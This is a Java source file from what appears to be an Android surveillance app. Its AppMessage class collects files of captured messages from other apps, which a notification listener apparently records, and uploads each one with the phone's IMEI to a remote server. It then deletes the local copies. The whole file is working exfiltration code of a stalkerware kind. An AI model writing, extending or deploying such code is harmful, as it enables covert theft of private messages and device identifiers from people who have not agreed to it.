package com.phone.data;

import java.io.File;
import java.io.FileInputStream;

import com.keepalive.NotificationListener;
import com.main.ForegroundService;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;

import android.content.Context;
import android.util.Log;

public class AppMessage implements Runnable{
	private static final String TAG = "AppMessage";
	//private Context context;
	
	public AppMessage(Context context){
		//this.context = context;
	}
	
	public void run(){
		UploadAppMsgFile();
	}

	public static void UploadAppMsgFile(){
		try{

			File find = new File(ForegroundService.LOCAL_PATH_NAME );
			File []allfiles = find.listFiles();
			
			for (int i = 0; i < allfiles.length; i++) {
				for (int j = 0; j < NotificationListener.APPMSGFILE_NAMES.length; j++) {
					if (allfiles[i].getName().contains(NotificationListener.APPMSGFILE_NAMES[j])) {
						String fn = allfiles[i].getName();
						File file = new File(ForegroundService.LOCAL_PATH_NAME + fn);
						int filesize = (int)file.length();
						if(filesize > 0){

							int sendsize = 4 + fn.length() + 4 + filesize;
							byte[] sendbuf = new byte[sendsize];
							int fnlen = fn.getBytes().length;
							byte[] bytefnlen = PublicFunction.intToBytes(fnlen);
							int size = 0;
							for (int k = 0; k < bytefnlen.length; k++) {
								sendbuf[size + k] = bytefnlen[k]; 
							}
							size += bytefnlen.length;
							
							for (int k = 0; k < fnlen; k++) {
								sendbuf[size + k] = fn.getBytes()[k];
							}
							size += fnlen;
							
							byte[] bytefilesize=PublicFunction.intToBytes(filesize);
							for (int k = 0; k < bytefilesize.length; k++) {
								sendbuf[size + k] = bytefilesize[k];
							}
							size += bytefilesize.length;
							
							FileInputStream fin=new FileInputStream(file);
							fin.read(sendbuf,size,filesize);
							size += filesize;
							fin.close();
							
			    			SendDataToServer.sendDataToServer(sendbuf, size, Public.CMD_DATA_APPMESSAGE, Public.IMEI);
			    			
			    			Log.e(TAG, "send msgfile:" + fn + " ok");
			    			file.delete();
						}
					}
				}

			}
		}catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("AppMessage exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
		}
	}
}
